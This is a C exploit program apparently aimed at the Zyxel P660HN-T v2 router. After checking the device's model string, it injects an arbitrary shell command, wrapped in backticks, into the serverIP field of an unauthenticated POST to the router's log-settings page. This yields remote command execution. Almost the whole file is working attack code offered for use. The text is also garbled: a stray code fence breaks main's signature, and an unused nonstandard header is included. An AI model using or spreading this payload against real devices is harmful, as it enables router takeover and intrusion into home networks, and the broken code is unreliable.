// "Zyxel P660HN-T v2

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <base64.h>

#define MAX_RESPONSE_SIZE 8192
#define TARGET_PORT 80

// Function to create a random string of given length
void random_string(char *str, size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (size_t i = 0; i < length; i++) {
        str[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    str[length] = '\0';
}

// Function to create an HTTP POST request
void create_http_post_request(const char *target_ip, const char *path, const char *data, char *request, size_t request_size) {
    snprintf(request, request_size,
             "POST %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Content-Type: application/x-www-form-urlencoded\r\n"
             "Connection: close\r\n"
             "Content-Length: %lu\r\n\r\n"
             "%s",
             path, target_ip, strlen(data), data);
}

// Function to send an HTTP POST request
int send_http_post_request(const char *target_ip, const char *path, const char *data) {
    int sock;
    struct sockaddr_in server_addr;
    char request[2048];
    char response[MAX_RESPONSE_SIZE];
    int bytes_received;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return -1;
    }

    create_http_post_request(target_ip, path, data, request, sizeof(request));
    send(sock, request, strlen(request), 0);

    memset(response, 0, sizeof(response));
    bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    close(sock);

    if (bytes_received < 0) {
        perror("Receive failed");
        return -1;
    }

    response[bytes_received] = '\0'; // Null-terminate the response
    return bytes_received;
}

// Function to execute a command
void execute_command(const char *target_ip, const char *cmd) {
    char payload[256];
    snprintf(payload, sizeof(payload), "1.1.1.1`%s`&#", cmd);

    char data[512];
    snprintf(data, sizeof(data),
             "logSetting_H=1&active=1&logMode=LocalAndRemote&serverPort=123&serverIP=%s",
             payload);

    send_http_post_request(target_ip, "/cgi-bin/pages/maintenance/logSetting/logSet.asp", data);
}

// Function to check vulnerability
int check_vulnerability(const char *target_ip) {
    char request[256];
    snprintf(request, sizeof(request), "GET /js/Multi_Language.js HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", target_ip);

    int sock;
    struct sockaddr_in server_addr;
    char response[MAX_RESPONSE_SIZE];
    int bytes_received;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return 0; // Not vulnerable
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return 0; // Not vulnerable
    }

    send(sock, request, strlen(request), 0);
    memset(response, 0, sizeof(response));
    bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    close(sock);

    response[bytes_received] = '\0'; // Null-terminate the response

    if (strstr(response, "P-660HN-T1A_IPv6") != NULL) {
        return 1; // Target is vulnerable
    }

    return 0; // Target is not vulnerable
}

// Main function
int main(int ```c
argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <target_ip> <command>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1]; // Target IP from command line argument
    const char *cmd = argv[2]; // Command to execute from command line argument

    if (check_vulnerability(target_ip)) { // Check if the target is vulnerable
        execute_command(target_ip, cmd); // Execute the command
        printf("Command executed successfully.\n");
    }

    return EXIT_SUCCESS;
}
